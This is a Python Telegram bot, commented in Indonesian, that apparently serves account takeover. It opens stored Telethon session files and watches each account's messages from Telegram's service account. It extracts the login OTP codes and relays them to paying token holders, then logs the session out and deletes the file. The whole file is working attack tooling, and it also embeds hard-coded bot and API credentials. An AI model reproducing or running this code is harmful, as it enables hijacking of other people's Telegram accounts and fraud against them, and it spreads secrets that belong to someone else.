import json
import os
import math
import time
import asyncio
import re
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes,
    MessageHandler, filters
)
from telethon import TelegramClient, events
from telethon.tl.functions.auth import LogOutRequest

API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
BOT_TOKEN = "7842777146:AAGgvD2u-kPZ5O00iRYcPxdQdSMoF69pMPg"
VALID_TOKENS = {
    "shena2": "mas dedi wa",
    "dedi": "User B",
    "putra": "putra",
    "shena3": "putra",
    "shena6": "putra",
    "anunya": "buyer",
    "tititmukecil": "buyer",
    "mbutmrewul": "dedi",
    "shena10": "ade",
    "tobrut": "dedi",
    "dew": "dewi",
    "shen1": "me"
}

SESSION_DIR = "7_1"
USED_TOKENS_FILE = "used_tokens.json"
USER_TOKENS_FILE = "user_tokens.json"
TOKEN_EXPIRE_SECONDS = 36000  # 10 jam

active_watchers = {}
watcher_tasks = {}

# --- Load used tokens ---
def load_json_file(filename):
    if os.path.exists(filename):
        with open(filename, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    else:
        with open(filename, "w") as f:
            json.dump({}, f)
        return {}

used_tokens = load_json_file(USED_TOKENS_FILE)
user_authenticated = load_json_file(USER_TOKENS_FILE)


def save_json_file(filename, data):
    with open(filename, "w") as f:
        json.dump(data, f, indent=2)


def save_used_tokens():
    save_json_file(USED_TOKENS_FILE, used_tokens)


def save_user_tokens():
    save_json_file(USER_TOKENS_FILE, user_authenticated)


def is_token_valid(token: str, user_id: str) -> bool:
    current_time = time.time()
    token_info = used_tokens.get(token)
    if not token_info:
        return False
    if current_time > token_info.get("expire_at", 0):
        # Token expired, hapus
        used_tokens.pop(token, None)
        save_used_tokens()
        return False
    if token_info["user_id"] != user_id:
        return False
    return True


def timestamp_to_str(ts):
    return datetime.fromtimestamp(ts).strftime("%d-%m-%Y %H:%M")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id in user_authenticated:
        token = user_authenticated[user_id]
        if is_token_valid(token, user_id):
            await update.message.reply_text(
                "👋 Anda sudah terautentikasi.\nGunakan /sessions untuk melihat daftar session."
            )
            return
        else:
            # Token expired, hapus data
            user_authenticated.pop(user_id, None)
            save_user_tokens()

    await update.message.reply_text("🔐 Kirim token akses untuk menggunakan bot ini:")


async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    user_id = str(update.effective_user.id)
    current_time = time.time()

    if token not in VALID_TOKENS:
        await update.message.reply_text("❌ Token tidak valid.")
        return

    token_info = used_tokens.get(token)
    if token_info:
        if not is_token_valid(token, user_id):
            if current_time > token_info.get("expire_at", 0):
                await update.message.reply_text("❌ Token sudah kedaluwarsa, minta token baru.")
                return
            else:
                await update.message.reply_text("⚠️ Token ini sudah digunakan oleh pengguna lain.")
                return
    else:
        # Token belum pernah dipakai, simpan dengan expired time
        used_tokens[token] = {"user_id": user_id, "expire_at": current_time + TOKEN_EXPIRE_SECONDS}
        save_used_tokens()
        token_info = used_tokens[token]

    user_authenticated[user_id] = token
    save_user_tokens()

    expire_str = timestamp_to_str(token_info.get("expire_at", 0))
    await update.message.reply_text(
        f"✅ Token valid untuk user `{user_id}`.\n"
        f"⏰ Expired at: {expire_str}",
        parse_mode="Markdown"
    )

    # Tampilkan daftar session
    await send_session_list(update, context, page=1)


# --- Session management ---

def get_all_sessions():
    if not os.path.exists(SESSION_DIR):
        return []
    return [f for f in os.listdir(SESSION_DIR) if f.endswith(".session")]

async def send_session_list_by_chat_id(bot, chat_id, page=1):
    sessions = get_all_sessions()
    items_per_page = 10
    total_pages = max(1, math.ceil(len(sessions) / items_per_page))
    page = max(1, min(page, total_pages))
    start = (page - 1) * items_per_page
    end = start + items_per_page
    current_sessions = sessions[start:end]

    keyboard = []
    for s in current_sessions:
        name = s[:-8] if s.endswith(".session") else s
        buttons = [
            InlineKeyboardButton(f"✅ Pantau: {name}", callback_data=f"use_{name}")
        ]
        if name in active_watchers:
            buttons.append(InlineKeyboardButton("🛑 Hentikan", callback_data=f"stop_{name}"))
        keyboard.append(buttons)

    # Tombol angka halaman
    nav_buttons = []
    for i in range(1, total_pages + 1):
        text = f"[{i}]" if i == page else str(i)
        nav_buttons.append(InlineKeyboardButton(text, callback_data=f"page_{i}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    if active_watchers:
        keyboard.append([InlineKeyboardButton("🧹 Clear Semua", callback_data="clear_all")])

    text = f"📂 Pilih session:\n\nHalaman {page} dari {total_pages}"

    await bot.send_message(chat_id, text, reply_markup=InlineKeyboardMarkup(keyboard))


async def send_session_list(update_or_query, context, page=1):
    if isinstance(update_or_query, Update):
        chat_id = update_or_query.message.chat_id
    else:
        # CallbackQuery
        chat_id = update_or_query.message.chat.id
    await send_session_list_by_chat_id(context.bot, chat_id, page)


async def list_active_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not active_watchers:
        await update.message.reply_text("🔕 Tidak ada session yang sedang dipantau.")
        return
    text = "📡 Session yang sedang dipantau:\n\n"
    for i, session in enumerate(active_watchers.keys(), 1):
        text += f"{i}. `{session}`\n"
    await update.message.reply_text(text, parse_mode="Markdown")


# --- OTP watcher with Telethon ---

async def watch_otp(session_name, bot, chat_id):
    session_path = os.path.join(SESSION_DIR, session_name)
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await bot.send_message(chat_id, f"```❌ Session `{session_name}` invalid.\n```", parse_mode="Markdown")
            await client.disconnect()
            return

        async def logout_and_cleanup():
            await asyncio.sleep(10)

            try:
                await client(LogOutRequest())
            except Exception as e:
                await bot.send_message(chat_id, f"⚠️ Gagal logout session `{session_name}`: {e}", parse_mode="Markdown")

            await client.disconnect()

            session_file = f"{session_path}.session"
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                    await bot.send_message(chat_id, f"🗑️ Session `{session_name}` dihapus dari daftar.", parse_mode="Markdown")
                except Exception as e:
                    await bot.send_message(chat_id, f"⚠️ Gagal hapus file session `{session_name}`: {e}", parse_mode="Markdown")

            try:
                await send_session_list_by_chat_id(bot, chat_id, page=1)
            except Exception as e:
                await bot.send_message(chat_id, f"⚠️ Gagal refresh daftar session: {e}", parse_mode="Markdown")

        @client.on(events.NewMessage(chats=777000))
        async def handler(event):
            message = event.raw_text
            match = re.search(r'\b\d{5,6}\b', message)
            if match:
                otp = match.group()
                await bot.send_message(chat_id, f"📩 OTP dari `{session_name}`: `{otp}`", parse_mode="Markdown")
                await logout_and_cleanup()
                # Stop watcher
                active_watchers.pop(session_name, None)
                task = watcher_tasks.pop(session_name, None)
                if task:
                    task.cancel()

        await client.run_until_disconnected()

    except asyncio.CancelledError:
        # Task cancelled, disconnect cleanly
        await client.disconnect()
    except Exception as e:
        await bot.send_message(chat_id, f"⚠️ Error pada session `{session_name}`: {e}", parse_mode="Markdown")
        await client.disconnect()


async def handle_use_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = query.message.chat.id

    if data.startswith("use_"):
        session_name = data[4:]
        if session_name in active_watchers:
            await query.message.reply_text(f"⚠️ Session `{session_name}` sudah dipantau.")
            return
        # Mulai watch OTP untuk session ini
        task = asyncio.create_task(watch_otp(session_name, context.bot, chat_id))
        active_watchers[session_name] = True
        watcher_tasks[session_name] = task
        await query.message.reply_text(
            f"▶️ Mulai pantau OTP session `{session_name}`",
            parse_mode="MarkdownV2"
        )

    elif data.startswith("stop_"):
        session_name = data[5:]
        if session_name in active_watchers:
            task = watcher_tasks.get(session_name)
            if task:
                task.cancel()
            active_watchers.pop(session_name, None)
            watcher_tasks.pop(session_name, None)
            await query.message.reply_text(
                f"⏹️ Pantauan session `{session_name}` dihentikan.",
                parse_mode="Markdown"
            )
        else:
            await query.message.reply_text(f"⚠️ Session `{session_name}` tidak sedang dipantau.")

    elif data.startswith("page_"):
        try:
            page_num = int(data[5:])
        except ValueError:
            page_num = 1
        # Refresh daftar session ke halaman tertentu
        await query.message.delete()
        await send_session_list(update.callback_query, context, page=page_num)

    elif data == "clear_all":
        # Hentikan semua watcher
        for session_name, task in watcher_tasks.items():
            task.cancel()
        active_watchers.clear()
        watcher_tasks.clear()
        await query.message.reply_text("🧹 Semua pantauan session dihentikan.")


async def sessions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_authenticated:
        await update.message.reply_text("❌ Anda belum mengautentikasi. Kirim token terlebih dahulu.")
        return
    await send_session_list(update, context, page=1)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📚 *Perintah yang tersedia:*\n\n"
        "/start - Mulai dan autentikasi token\n"
        "/sessions - Tampilkan daftar session\n"
        "/active - Tampilkan session yang sedang dipantau\n"
        "/help - Bantuan"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sessions", sessions_command))
    application.add_handler(CommandHandler("active", list_active_sessions))
    application.add_handler(CommandHandler("help", help_command))

    # Token handler (assume token sent as plain text, no slash command)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token))

    # CallbackQuery handler for buttons
    application.add_handler(CallbackQueryHandler(handle_use_callback))

    print("Bot berjalan...")
    application.run_polling()


if __name__ == "__main__":
    main()
